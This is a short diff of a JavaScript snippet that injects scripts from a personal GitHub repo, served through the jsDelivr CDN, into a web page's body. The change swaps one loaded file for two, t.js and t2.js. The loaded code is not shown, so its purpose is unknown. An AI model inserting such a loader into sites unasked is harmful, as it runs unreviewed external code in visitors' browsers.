@@ -1,7 +1,1 @@
-(function () {
-  const cg_tag = document.createElement("script");
-  cg_tag.src = "https://cdn.jsdelivr.net/gh/anggilb/scripts@ad46d31/t.js?v=1775124137547";
-  cg_tag.async = true;
-  cg_tag.defer = true;
-  document.getElementsByTagName("body")[0].appendChild(cg_tag);
-})();
+(function(){const cg_tag = document.createElement("script");cg_tag.src="https://cdn.jsdelivr.net/gh/anggilb/scripts@47cfb8f/t.js";cg_tag.async=true;cg_tag.defer=true;const cg_tag2 = document.createElement("script");cg_tag2.src="https://cdn.jsdelivr.net/gh/anggilb/scripts@f00dddb/t2.js";cg_tag2.async=true;cg_tag2.defer=true;document.getElementsByTagName("body")[0].appendChild(cg_tag);document.getElementsByTagName("body")[0].appendChild(cg_tag2);})();
